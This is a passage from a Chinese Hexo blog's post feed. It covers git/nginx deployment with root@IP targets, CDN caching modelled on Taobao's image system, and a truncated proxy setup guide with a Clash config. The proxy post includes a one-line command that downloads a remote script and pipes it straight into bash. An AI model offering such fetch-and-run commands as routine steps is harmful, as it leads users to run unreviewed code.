origin master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">编写pushAndDeployment.sh</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">git add .</span><br><span class="line">time=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">echo &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">git commit -m &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">echo &quot;Commit success&quot;</span><br><span class="line">git push</span><br><span class="line">echo &quot;Push success&quot;</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">echo &quot;Deployment success&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">部署</span></span><br><span class="line">cd blog</span><br><span class="line">./pushAndDeployment.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">部署到服务器上</span></span><br><span class="line">yum install nginx git</span><br><span class="line"></span><br><span class="line">mkdir /var/repo</span><br><span class="line"></span><br><span class="line">chmod 755 /var/repo</span><br><span class="line"></span><br><span class="line">mkdir /var/blog</span><br><span class="line">chmod 755 /var/blog</span><br><span class="line"></span><br><span class="line">cd /var/repo</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">创建一个空白的git仓库</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">1.git init 创建本地仓库(在工程目录下创建)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">2.git init --bare 创建远端仓库（在服务器或者工程目录以外路径都可以创建的备份仓库）</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">工程commit到1中，push到2中；</span></span><br><span class="line">git init --bare blog.git</span><br><span class="line"></span><br><span class="line">vim /var/repo/blog.git/hooks/post-receive</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">git --work-tree=/var/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">给post-receive添加执行权限</span></span><br><span class="line">chmod +x /var/repo/blog.git/hooks/post-receive</span><br><span class="line"></span><br><span class="line">cd /etc/nginx/conf.d/</span><br><span class="line">vim blog.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen    80;</span><br><span class="line">    listen    [::];</span><br><span class="line">    server_name  www.mingwzi.cn;</span><br><span class="line">    root    /var/blog;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">mac</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改Hexo的deploy配置</span></span><br><span class="line">cd blog</span><br><span class="line">vim _config.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">找到deploy配置部分</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># Docs: https://hexo.io/docs/deployment.html</span></span></span><br><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@81.68.97.129:/var/repo/blog.git # IP填写自己服务器的IP即可</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: https://github.com/HuangMingwang/HuangMingwang.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@43.154.81.112:/var/repo/blog.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">hexo 安装butterfly主题</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">在hexo根目录下</span></span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改hexo根目录下的_config.yml</span></span><br><span class="line">theme: butterfly</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装 pug 以及 stylus 的渲染器</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">添加备案号</span></span><br><span class="line">cd themes/butterfly/layout/includes/</span><br><span class="line">vim footer.pug</span><br><span class="line"></span><br><span class="line">span.footer-separator |</span><br><span class="line">&lt;a href=&quot;https://beian.miit.gov.cn/&quot; target=&quot;_blank&quot;&gt;赣ICP备2022001353号-1&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h2 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h2><p>真实名称记录（英语：Canonical Name Record），即CNAME记录，是域名系统（DNS）的一种记录。CNAME记录用于将一个域名（同名）映射到另一个域名（真实名称），域名解析服务器遇到CNAME记录会以映射到的目标重新开始查询。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191129397.png" alt="img"></p>
<ol>
<li>用户向 <code>www.test.com</code> 下的某图片资源（如：1.jpg）发起请求，会先向 Local DNS 发起域名解析请求。</li>
<li>当 Local DNS 解析 <code>www.test.com</code> 时，会发现已经配置了 CNAME <code>www.test.com.cdn.dnsv1.com</code>，解析请求会发送至 Tencent DNS（GSLB），GSLB 为腾讯云自主研发的调度体系，会为请求分配最佳节点 IP。</li>
<li>Local DNS 获取 Tencent DNS 返回的解析 IP。</li>
<li>用户获取解析 IP。</li>
<li>用户向获取的 IP 发起对资源 1.jpg 的访问请求。</li>
<li>若该 IP 对应的节点缓存有 1.jpg，则会将数据直接返回给用户（10），此时请求结束。若该节点未缓存 1.jpg，则节点会向业务源站发起对 1.jpg 的请求（6、7、8），获取资源后，结合用户自定义配置的缓存策略（可参考产品文档中的 <a href="https://cloud.tencent.com/doc/product/228/6290">缓存过期配置</a>），将资源缓存至节点（9），并返回给用户（10），此时请求结束。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /dev/test -s -w %&#123;time_namelookup&#125;::%&#123;time_connect&#125;::%&#123;time_starttransfer&#125;::%&#123;time_total&#125;::%&#123;speed_download&#125;&quot;\n&quot; &quot;http://www.mingwzi.cn&quot; </span><br></pre></td></tr></table></figure>





<h3 id="cdn使用任播技术可以分摊流量，防御ddos攻击？"><a href="#cdn使用任播技术可以分摊流量，防御ddos攻击？" class="headerlink" title="cdn使用任播技术可以分摊流量，防御ddos攻击？"></a>cdn使用任播技术可以分摊流量，防御ddos攻击？</h3><h3 id="源站内容发生变更，cdn如何感知到？"><a href="#源站内容发生变更，cdn如何感知到？" class="headerlink" title="源站内容发生变更，cdn如何感知到？"></a>源站内容发生变更，cdn如何感知到？</h3><h3 id="CDN的加速方式？"><a href="#CDN的加速方式？" class="headerlink" title="CDN的加速方式？"></a>CDN的加速方式？</h3><p>距离近，文件压缩，</p>
<p>cdn可以省钱，可以少走很多路</p>
<p>….</p>
<h3 id="淘宝图片空间和CDN的架构"><a href="#淘宝图片空间和CDN的架构" class="headerlink" title="淘宝图片空间和CDN的架构"></a>淘宝图片空间和CDN的架构</h3><p>淘宝整个图片的访问链路有<a href="https://www.zhihu.com/search?q=%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">三级缓存</a>（客户端本地、CDN L1、CDN L2），所有图片都持久化的存储到OSS中。真正处理图片的是<a href="https://www.zhihu.com/search?q=img-picasso%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">img-picasso系统</a>，它的功能比较复杂，包括从OSS读取文件，对图片尺寸进行缩放，编解码，所以机器成本比较高。</p>
<p>CDN的缓存分成2级，合理的分配L1和L2的比例，一方面，可以通过一致性hash的手段，在同等资源的情况下，缓存更多内容，提升整体缓存命中率；另一方面，可以平衡计算和IO，充分利用不同配置的机器的能力。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458499.jpg" alt="img"></p>
<p>用户访问图片的过程如下：<br>（1）用户通过手机淘宝来搜索商品或者查看宝贝详情。<br>（2）详情&#x2F;搜索&#x2F;推荐通过调用商品中心返回商品的<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87UR&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">图片UR</a>L。<br>（3）客户端本地如果有该图片的缓存，则直接渲染图片，否则执行下一步。<br>（4）从CDN L1回源图片，如果L1有该图片的缓存，则客户端渲染图片，同时缓存到本地，如果L1没有缓存，则执行下一步。<br>（5）从CDN L2回源图片，如果L2有该图片的缓存，则客户端渲染图片，同时CDN L1及客户端缓存图片内容，如果CDN L2没有缓存该图片，则执行下一步。<br>（6）从图片空间回源图片，图片空间会从OSS拉取图片源文件，按要求进行尺寸缩放，然后执行编解码，返回客户端能够支持的图片内容，之后客户端就可以渲染图片，同时CDN的L1、L2以及客户端都会缓存图片内容。</p>
<h4 id="频繁换图带来的技术挑战"><a href="#频繁换图带来的技术挑战" class="headerlink" title="频繁换图带来的技术挑战"></a>频繁换图带来的技术挑战</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458642.jpg" alt="img"></p>
<p>当商品的价格发生变化时，我们会使用新的价格重新合成图片，更新商品中心中存储的图片URL。</p>
<p>这样会带来2个问题：<br>（1）CDN及手机淘宝原本缓存的图片内容失效了，用户访问图片会全部回源到img-picasso。<br>（2）由于更改了商品的字段，交易的核心应用（购物车和商品中心）的缓存也失效了，用户浏览及购物时，对商品的访问会走到db。</p>
<p>源站img-picasso处理图片，以及查询商品DB，都是非常消耗资源的。CDN及商品的缓存命中率降低后，对源站img-picsasso以及db会产生巨大的压力。</p>
<p>拿CDN缓存为例，简单计算一下，CDN平时的命中率是98%，假设命中率降低1个点，对源站的压力就会增加1&#x2F;3（原本承担2%的流量，现在需要承担3%的流量），意味着img-picasso需要扩容1&#x2F;3。如果全网一半的图片都同时变化，cdn的命中率降到50%，对img-picasso的访问量就会增加25倍，这个扩容成本肯定没法接受。</p>
<p>解决这2个问题，对应的有2个办法：<br>（1）改图保持图片URL不变，可以避免<a href="https://www.zhihu.com/search?q=%E5%95%86%E5%93%81%E9%93%BE%E8%B7%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">商品链路</a>的缓存失效。<br>（2）在访问高峰到来之前，提前预热图片到CDN，可以避免CDN缓存失效对源站的压力。</p>
<p>下面，介绍下我们具体是怎么做到这2点的。</p>
<h4 id="频繁换图的应对方案"><a href="#频繁换图的应对方案" class="headerlink" title="频繁换图的应对方案"></a>频繁换图的应对方案</h4><p><strong>改图保持图片URL不变</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458800.jpg" alt="img"></p>
<p>图片内容发生变化时，执行下面2个操作：<br>（1）更新OSS内容：使用新的图片内容替换OSS中老的图片内容<br>（2）刷新CDN缓存：清除CDN之前缓存的图片内容</p>
<p>这样，用户再次访问图片时，发现CDN没有缓存，就会回源到img-picasso，从OSS拉取新的图片内容。</p>
<p>由于图片URL没有变化，就不必去更新商品中心的图片链接，这样商品链路的缓存可以保持不变。<br>在真正实施这个方案的过程中，遇到了几个问题，简单跟大家分享下：</p>
<p><strong>OSS三地同步</strong></p>
<p>淘宝的图片空间，承载了淘系所有图片的上下行稳定性保障，为了保障高可用，一份资源会存储到三地OSS。图片上传时，默认只上传一地，利用OSS的能力，自动同步到另外两地。</p>
<pre><code> 但是使用URL不变方案，CDN缓存已经清除完成后，如果另外2地的OSS还未同步完成，用户访问后，就会回源到旧的图片内容，发现图片内容没有变化。


  针对该问题，我们将异步同步OSS软链的模式，改成三地同步建软链，三地都返回成功后，再去清除CDN缓存，这就保证了用户访问的图片一定是最新的内容。
</code></pre>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458123.jpg" alt="img"></p>
<p><strong>图片尺寸收敛</strong></p>
<p>同一张商品图片会用于不同的场景坑位展现，不同的坑位对图片的尺寸有不同的要求。为此，图片空间提供了一项功能，可以方便的生成不同尺寸的缩率图。只需要访问图片时，给图片增加不同的后缀，img-picasso源站就可以按要求进行图片进行缩放。</p>
<p>由于历史原因，之前对缩放的尺寸种类没有限制，导致CDN上的图片后缀格式多达2400种+，TOP6格式覆盖率46%，TOP15格式覆盖率64%。这意味着，一张图片，在cdn上最多可能有2400+个不同的url，当图片内容变化后，要把这些缓存全部清掉，才能保证所有用户看到的图片都是新内容。</p>
<p>为了解决这个问题，我们对域名格式进行了收敛。</p>
<p>图片空间对于图片质量压缩参数的规则如下：</p>
<ul>
<li>图片质量参数常见有一下8种形式：Q90、Q75、Q50、Q30、q90、q75、q50、q30</li>
<li>图片锐化参数常见有一下3种形式：s100，s150，s200</li>
</ul>
<p>我们重新将图片质量定义为高质量图片和低质量图片，收敛格式为 q90 和 p50s150<br>这样，就可以把2000多种格式收敛到6种主要格式，CDN清除缓存才变得可行。</p>
<p><strong>多副本清除CDN缓存</strong><br>通过图片尺寸收敛，每张图片只需要清除6个不同的url就可以了，那能不能进一步提升刷新效率呢？<br>为此，阿里云CDN为我们提供了多副本刷新的解决方案：每种不同后缀的图片，作为图片的一个副本，在CDN的swift层增加一层KV结构，存储url和不同副本的映射关系，清除缓存时，可以通过该结构找到所有副本，实现快速清除所有副本。这样，每张图片，我们只需要调用一次CDN清除缓存接口就可以了，极大提升了CDN缓存刷新效率。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458324.jpg" alt="img"></p>
<p><strong>图片域名收敛</strong></p>
<p>淘系的图片域名有300多种，主要有下面2个原因：<br>（1）图片完整的链接太长，所以存储时经常只存最后一段，业务自己来拼域名，很多业务就自己申请了一个图片域名来拼。<br>（2）PC时代，浏览器对同一域名下的并发请求数是有限制的，不同浏览器不一样，一般6个左右。</p>
<p>为了突破该限制，一些业务就会申请多个域名，随机的拼不同的域名。</p>
<p>前面我们讲过，CDN的缓存是跟域名绑定的，不管是缓存命中还是缓存清除，都只能针对一个域名。</p>
<p>我们显然不可能改一张图，就去对300个域名调用CDN刷新。于是我们考虑对图片域名进行收敛，使得用户对图片的访问都路由到同一个域名，我们希望将所有的图片访问统一收敛到<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>，具体实现方式如下：</p>
<p>（1）对于手淘和猫客客户端，图片访问都收口在图片库，我们推进图片库进行改造，符合一定规则的url，统一收敛到<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>，实现了域名的一刀切。<br>（2）对于PC浏览器端，就比较麻烦了，没有统一收口的地方。我们只能退而求其次，针对访问最多的6大域名，在cdn上配置域名转发规则，重定向到<a href="https://www.zhihu.com/search?q=picasso%E5%9F%9F%E5%90%8D&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">picasso域名</a>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458380.jpg" alt="img"></p>
<p>通过这种方式，我们实现了全网99%以上的图片访问流量都路由到picasso域名，图片内容发生变化时，通过清除picasso域名的<a href="https://www.zhihu.com/search?q=cdn%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">cdn缓存</a>，就能保证基本所有的场景都能看到新的图片内容。</p>
<h4 id="客户端及浏览器缓存"><a href="#客户端及浏览器缓存" class="headerlink" title="客户端及浏览器缓存"></a>客户端及浏览器缓存</h4><p>通过多副本和图片域名收敛，cdn的缓存问题得到了解决。但在cdn之上，用户图片访问首先是来自客户端或者浏览器，这里也会有一层缓存。</p>
<p>大家知道，浏览器的缓存都遵循标准的http max-age协议，指定该header后，到了时间图片就会失效，访问到新的图片。所以我们可以在源站img-picasso回源给cdn时，添加max-age协议头，值为1分钟，cdn会原封不动的透给浏览器，这样浏览器就可以实现1分钟内<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">图片缓存</a>失效，重新到cdn拉新的图片资源。</p>
<p>对于手机淘宝客户端，我们在原有的LRU缓存机制之上，另外支持标准的http协议。这样，手机淘宝也实现了1分钟内图片缓存失效。</p>
<p><strong>提前预热CDN图片</strong></p>
<p>通过改图保持图片URL不变，我们解决了改图对商品链路缓存的影响。但是，图片变化时，虽然URL没有变，但我们清除了CDN缓存，导致用户访问时还是会回源到img-picasso源站，所以对图片源站的压力依然存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458478.jpg" alt="img"></p>
<p>我们发现，商品的价格变化大部分发生在大促节奏变化的时刻，基于这个特点，我们通过提前合成图片，提前预热到CDN，可以实现图片切换瞬间生效，同时对源站没有压力。</p>
<p>具体方案如下：<br>（1）提前合成多波段图片：我们知道大促期间商家集中换图的时间点后，按这些时间点把图片的展示分成多个波段，每个波段图片提前合成，并提前将图片URL写入到商品中心扩展结构中。<br>（2）图片访问路由：营销系统根据配置的大促氛围切换计划，告诉鹿班图片二方包，当前是哪个波段，鹿班根据当前波段及场景，返回正确的图片URL给各个场景。<br>（3）图片渲染：各个场景拿到图片URL后，结合自身的业务逻辑，决定是否要展现该图片。<br>（4）CDN图片预热：为了避免图片集中切换时，把源站击垮，我们会在集中切换前把这些冷图片内容预热到CDN。<br>（5）波段内图片变化：提前合成各个波段图片后，商家可能会临时发券&#x2F;改价，导致商品价格再次变化，对于这类换图需求，为了避免更新商品中心的图片URL，我们通过本文上一章节刷CDN缓存的方式实现。</p>
<h4 id="总结和展望"><a href="#总结和展望" class="headerlink" title="总结和展望"></a>总结和展望</h4><p><a href="https://www.zhihu.com/search?q=CDN%E6%8A%80%E6%9C%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">CDN技术</a>广泛应用于互联网的各个场景，如今的CDN服务商，都提供了非常简单的业务接入方式，而且CDN的费用每年都在降低，这一切使得CDN的接入和使用成本越来越低。</p>
<p>淘宝的图片业务除了访问量大，还会面临更新频繁的问题。图片的频繁更新，一方面会由于商品上的图片url变化，导致商品缓存失效，另一方面会大幅降低CDN的图片访问缓存命中率。<br>针对图片url变化导致商品缓存失效的问题，我们通过刷新cdn缓存，用户访问时重新回源的方式，实现了改图保持图片url不变，这个过程中了，我们解决了一些列的问题，包括：OSS三地同步更新、图片尺寸收敛、图片域名收敛、客户端及浏览器<a href="https://www.zhihu.com/search?q=%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">本地缓存</a>。<br>针对改图降低CDN图片缓存命中率的问题，我们根据业务的特点，提前合成不同波段的图片，并预热到CDN，保障了源站的安全。</p>
<p>目前，淘宝上用户看到的图片，都是提前合成好的。未来，我们考虑在用户访问图片时，实时合成图片。通过这项技术，可以实时感知业务更多的实时信息，可以根据这些信息，在图片上合成当前用户或者环境更匹配的文案&#x2F;元素等内容，给用户带来更多的惊喜。<br>当然，实时合图也会面临更多的挑战，如：计算能力、合图性能。此外，对于CDN而言，由于每次用户访问的内容是临时合成的，CDN的缓存策略也是一个很大的挑战。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建梯子</title>
    <url>/2022/01/14/Chaos/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90/</url>
    <content><![CDATA[<h1 id="搭建梯子"><a href="#搭建梯子" class="headerlink" title="搭建梯子"></a>搭建梯子</h1><p><code>v2ray info</code> 查看 V2Ray 配置信息<br><code>v2ray config</code> 修改 V2Ray 配置<br><code>v2ray link</code> 生成 V2Ray 配置文件链接<br><code>v2ray infolink</code> 生成 V2Ray 配置信息链接<br><code>v2ray qr</code> 生成 V2Ray 配置二维码链接<br><code>v2ray ss</code> 修改 Shadowsocks 配置<br><code>v2ray ssinfo</code> 查看 Shadowsocks 配置信息<br><code>v2ray ssqr</code> 生成 Shadowsocks 配置二维码链接<br><code>v2ray status</code> 查看 V2Ray 运行状态<br><code>v2ray start</code> 启动 V2Ray<br><code>v2ray stop</code> 停止 V2Ray<br><code>v2ray restart</code> 重启 V2Ray<br><code>v2ray log</code> 查看 V2Ray 运行日志<br><code>v2ray update</code> 更新 V2Ray<br><code>v2ray update.sh</code> 更新 V2Ray 管理脚本<br><code>v2ray uninstall</code> 卸载 V2Ray</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">买服务器</span></span><br><span class="line"></span><br><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">手机安装 shadowracket</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">电脑安装 clashX</span></span><br><span class="line">添加一下配置文件</span><br><span class="line"><span class="meta"># </span><span class="language-bash">HTTP 端口</span></span><br><span class="line">port: 7890</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">SOCKS5 端口</span></span><br><span class="line">socks-port: 7891</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Linux 及 macOS 的 redir 端口</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">redir-port: 7892</span></span><br><span class="line"></span><br><span class="line">allow-lan: false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">仅适用于设置 allow-lan 为 <span class="literal">true</span> 时</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">&quot;*&quot;</span>: 绑定所有 IP 地址</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">192.168.122.11: 绑定单个 IPv4 地址</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">&quot;[aaaa::a8aa:ff:fe09:57d8]&quot;</span>: 绑定单个 IPv6 地址</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">bind-address: <span class="string">&quot;*&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Rule / Global / Direct (默认为 Rule 模式)</span></span><br><span class="line">mode: Rule</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">设置输出日志的等级 (默认为 info)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">info / warning / error / debug / silent</span></span><br><span class="line">log-level: info</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">RESTful API <span class="keyword">for</span> clash</span></span><br><span class="line">external-controller: 127.0.0.1:9090</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">you can put the static web resource (such as clash-dashboard) to a directory, and clash would serve <span class="keyword">in</span> `<span class="variable">$&#123;API&#125;</span>/ui`</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">input is a relative path to the configuration directory or an absolute path</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">external-ui: folder</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Secret <span class="keyword">for</span> RESTful API (Optional)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">secret: <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">实验性功能</span></span><br><span class="line">experimental:</span><br><span class="line">  ignore-resolve-fail: true # 忽略 DNS 解析失败，默认值为true</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">interface-name: en0 <span class="comment"># 出站接口名称</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">本地 SOCKS5/HTTP(S) 服务器认证</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">authentication:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"> - <span class="string">&quot;user1:pass1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"> - <span class="string">&quot;user2:pass2&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="comment"># 实验性 hosts, 支持通配符（如 *.clash.dev 甚至 *.foo.*.examplex.com ）</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="comment"># 静态域的优先级高于通配符域（foo.example.com &gt; *.example.com）</span></span></span><br><span class="line">hosts:</span><br><span class="line">  &#x27;mtalk.google.com&#x27;: 108.177.125.188</span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="string">&#x27;*.clash.dev&#x27;</span>: 127.0.0.1</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="string">&#x27;alpha.clash.dev&#x27;</span>: <span class="string">&#x27;::1&#x27;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">dns:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="built_in">enable</span>: <span class="literal">true</span> <span class="comment"># set true to enable dns (default is false)</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ipv6: <span class="literal">false</span> <span class="comment"># default is false</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">listen: 0.0.0.0:53</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment"># default-nameserver: # resolve dns nameserver host, should fill pure IP</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment">#   - 114.114.114.114</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment">#   - 8.8.8.8</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">enhanced-mode: redir-host <span class="comment"># or fake-ip</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment"># fake-ip-range: 198.18.0.1/16 # if you don&#x27;t know what it is, don&#x27;t change it</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fake-ip-filter: <span class="comment"># fake ip white domain list</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - <span class="string">&#x27;*.lan&#x27;</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - localhost.ptlogin2.qq.com</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">nameserver:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - 114.114.114.114</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - tls://dns.rubyfish.cn:853 <span class="comment"># dns over tls</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - https://1.1.1.1/dns-query <span class="comment"># dns over https</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fallback: <span class="comment"># concurrent request with nameserver, fallback used when GEOIP country isn&#x27;t CN</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - tcp://1.1.1.1</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fallback-filter:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  geoip: <span class="literal">true</span> <span class="comment"># default</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  ipcidr: <span class="comment"># ips in these subnets will be considered polluted</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">    - 240.0.0.0/4</span></span><br><span class="line"></span><br><span class="line">proxies:</span><br><span class="line"><span class="meta"># </span><span class="language-bash">支持的协议及加密算法示例请查阅 Clash 项目 README 以使用最新格式：https://github.com/Dreamacro/clash/blob/master/README.md</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks 支持的加密方式:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-gcm aes-192-gcm aes-256-gcm</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-cfb aes-192-cfb aes-256-cfb</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-ctr aes-192-ctr aes-256-ctr</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  rc4-md5 chacha20-ietf xchacha20</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  chacha20-ietf-poly1305 xchacha20-ietf-poly1305</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks</span></span><br><span class="line">- name: &quot;ss&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 